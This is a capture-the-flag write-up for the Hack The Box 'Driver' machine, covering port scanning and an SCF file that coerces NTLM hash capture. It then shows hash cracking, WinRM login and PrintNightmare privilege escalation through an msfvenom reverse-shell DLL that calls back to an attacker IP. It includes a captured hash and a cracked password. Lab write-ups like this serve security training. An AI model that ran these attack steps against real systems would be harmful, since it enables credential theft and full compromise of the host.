# By vishok driver
# htb writeup
####
####
####
## Open ports in the target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="info">

> Reconnaissance or footprinting is the most critical phase of a pentest, and **Nmap** is the essential tool for it. Nmap automate the reconigtion avoiding that you depend of supositions or blind attacks.
</div>

####
```perl
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```
####
How are many ports, is a little tedious insert one to one port in a new line to make a new scan to discover the services, so I use this approach to make easier the work:
####
```ruby
echo '
    80/tcp   open  http
    135/tcp  open  msrpc
    445/tcp  open  microsoft-ds
    5985/tcp open  wsman
' | grep -oE '^([0-9])+' | sed -z 's/\n/,/g'
```
####
| Grep param | Description |
| ----- | ----- |
| -o | Make unique matches |
| -E | Find other results into a unique string |
####
| Sed param | Description |
| ----- | ----- |
| -z | Separate lines for each null character, is used to sustitute |
| s/ | Especify the start of the sustitution |
| /g | Especify the end of the sustitution |
####
### Nmap version:
```perl
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-05-01T02:22:33
|_  start_date: 2025-05-01T02:10:34
|_clock-skew: mean: 7h52m10s, deviation: 0s, median: 7h52m09s
```
####
####
####
## Services that are running in the target machine
### HTTP:
In the target machine is running the *HTTP* service, so a posible aproaching is check this service. We don't have a domain, so is necessary use the direct ip into the browser: http://10.10.11.106. Before we are able to see something the web request us for credentials:
####
<div class="img">
    <img src="/machines/public/driver/1.png" loading="lazy" decoding="async" />
</div>

####
Currently, we don't have credentials of any kind, so we could try to enter using a common credentials, e.g. `admin:admin`. Effectively, those were a credentials to this site. At the moment to enter we can note that the service *HTTP* run over printer.
####
<div class="img">
    <img src="/machines/public/driver/2.png" loading="lazy" decoding="async" />
</div>

####
Well, we can see that the printer posses a upload finware update file section. This supose a risk because the most problematic attack in windows is a *SMB Relay*. So we will try to exploit this vulnerability. The *SMB Relay* is present when a autenticated user that is part or not of a *DC* access to a shared resource at nwtwork level.
####
<div class="info">

> The **SCF** file may contain a reference to a remote **SMB** resource (e.g., a share on your attacking machine). When the printer or system processing the SCF attempts to access that SMB resource, it may send NTLM credentials or attempt to authenticate, which can be exploited to capture hashes or perform relay attacks. 
</div>

####
Here we could try to exploit this aproach, first we need to craft a *SCF* file and insert code to aim towards the SMB shared resource in our machine:
####
```ruby
touch payload.scf
echo '
    [Shell]
    Command=2
    IconFile=\\10.10.16.12\test
    [Taskbar]
    Command=ToggleDesktop
' > payload.scf
```
####
Now, our interface tha have comunication with the target machine is the **tun0**, so we need to listening this interface to capture the NTLM hash. Exist to forms to do that:
####
```ruby
sudo responder -I tun0 -dwv
sudo impacket-smbserver test $(pwd) -smb2support
```
####
| Responder param | Description |
| ----- | ----- |
| -I | Especify the interface to start listen |
| -d | Enable answers for DHCP broadcast requests |
| -w | Start the WPAD rogue proxy server |
| -v | Verbose mode |
####
| Impacket param | Description |
| ----- | ----- |
| test | Name of the shared resource |
| $(pwd) | `pwd` command return the current path, and this syncronize the shared resource with the current path |
| -smb2support | Give support at the version **2** of the *SMB* |
####
In both cases we will are able to intercept the *NTLM* hashes:
####
<div class="img">
    <img src="/machines/public/driver/3.png" loading="lazy" decoding="async" />
</div>

####
This is the hash structure:
####
```ruby
tony::DRIVER:aaaaaaaaaaaaaaaa:a2352207d9c1fa12776aee6c852b09e1:01010000000000000014952210badb01ee82417ea2be7600000000000100100042005200560065006500590066005900030010004200520056006500650059006600590002001000520055004b0054006e007a006400510004001000520055004b0054006e007a0064005100070008000014952210badb010600040002000000080030003000000000000000000000000020000054bd8988e177fb1e06edbc3d3e51345e48b9596986ef5348689fd8cf2c76ffe10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0031003200000000000000000000000000
```
#### 
#### 
#### 
## First explotation phase
### John the ripper:
We could put this hash into a file to try crack it using **John the ripper**.
####
```ruby
echo 'tony::DRIVER:7928791e10ff998d:7AF63E519B1906A7978BB03200EBE202:0101000000000000801364FECCB9DB01797A9DFB63993B70000000000200080032004C004800470001001E00570049004E002D0056004B0047003800420051004600300053005400310004003400570049004E002D0056004B004700380042005100460030005300540031002E0032004C00480047002E004C004F00430041004C000300140032004C00480047002E004C004F00430041004C000500140032004C00480047002E004C004F00430041004C0007000800801364FECCB9DB010600040002000000080030003000000000000000000000000020000054BD8988E177FB1E06EDBC3D3E51345E48B9596986EF5348689FD8CF2C76FFE10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0031003200000000000000000000000000' > hash.txt

john --wordlist=/usr/share/wordlists/dictionary/rockyou.txt hash.txt

Result ->
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2025-04-30 12:43) 12.50g/s 409600p/s 409600c/s 409600C/s zombies..dyesebel
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
####
<div class="warning">

> All hashes are the same, always you get the same password  
</div>

####
The *5985* port is open, remeber, this port is a *Windows Remote Management*, so we have a tool to establish a connection towards the target machine using the **evil-winrm**:
####
```ruby
evil-winrm -i 10.10.11.106 -u tony -p liltony
```
####
| Evil-winrm param | Description |
| ----- | ----- |
| -i | Epecify the target machine ip |
| -u | Especify the user |
| -p | Especify the password |
####
####
####
## Second exploit phase (Privilage Escalation)
### RPC:
Exist a vulnerability in Windows: *PrintNightmare*, this vulnerability is a critical security flaw in the Windows *Print Spooler* service that allows attackers to execute arbitrary code with SYSTEM-level privileges (the highest level of access on a Windows system). This vulnerability was publicly disclosed in June 2021 and affected multiple versions of Windows, including Windows 7, 8.1, 10, and Windows Server systems.
####
The way to discover if a target machine is vulnerable at this is dump a RPC interfaces to found one or both: [*MS-RPRN*, *MS-PAR*], for do that, we need to use a **impacket** tool:
####
```ruby
 impacket-rpcdump 10.10.11.106 > rpcdata.txt
```
####
Then:
####
```ruby
cat rpcdata.txt | grep MS-R

Result ->
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```
####
If we found the [*MS-RPRN*], we can use this tool [PrintNightmare-CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675). First, we need to craft a **dll** using **msfvenom**:
####
```ruby
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.12 LPORT=1234 -f dll > shell.dll
```
####
Afther that we need to insert in the final of **.ps1** file the next line: `Invoke-Nightmare -DLL "C:\Users\tony\shell.dll"`. How we are connected using **evil-winrm**, we can upload files using the `upload` command: `upload CVE-2021-1675.ps1` and `upload shell.dll`. At the moment to upload those files we can use a absolute path or move the files to the path when we start a evil-winrm sessiom.
####
Finally we need to execute this in the target machine: `PowerShell.exe -ExecutionPolicy Bypass .\CVE-2021-1675.ps1`. This send us a revershell so is necessary listen to receive that connection: `rlwrap nc -nlvp 1234`.
####
<div class="img">
    <img src="/machines/public/driver/4.png" loading="lazy" decoding="async" />
</div>
